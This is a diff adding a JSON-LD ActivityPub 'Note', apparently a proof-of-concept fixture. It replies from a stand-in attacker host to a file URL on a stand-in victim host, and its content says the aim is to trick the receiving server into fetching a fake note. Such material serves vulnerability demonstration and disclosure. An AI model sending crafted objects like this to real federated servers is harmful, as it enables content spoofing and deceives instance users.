@@ -1,0 +1,11 @@
+{
+  "@context": "https://www.w3.org/ns/activitystreams",
+  "id": "https://attacker.poc.example/objects/notes/fake-note-reply.jsonld",
+  "type": "Note",
+  "attributedTo": "https://attacker.poc.example/objects/@attacker.jsonld",
+  "inReplyTo": "https://victim.poc.example/files/deadbeef-badb-adba-dbad-000000000000",
+  "content": "RYPLYING TO THE FAKE NOTE TO TRICK THE RECEPIENT SERVER INTO FETCHING IT",
+  "published": "2015-02-10T15:04:55Z",
+  "to": "https://www.w3.org/ns/activitystreams#Public",
+  "cc": "https://attacker.poc.example/objects/@attacker/followers.jsonld"
+}
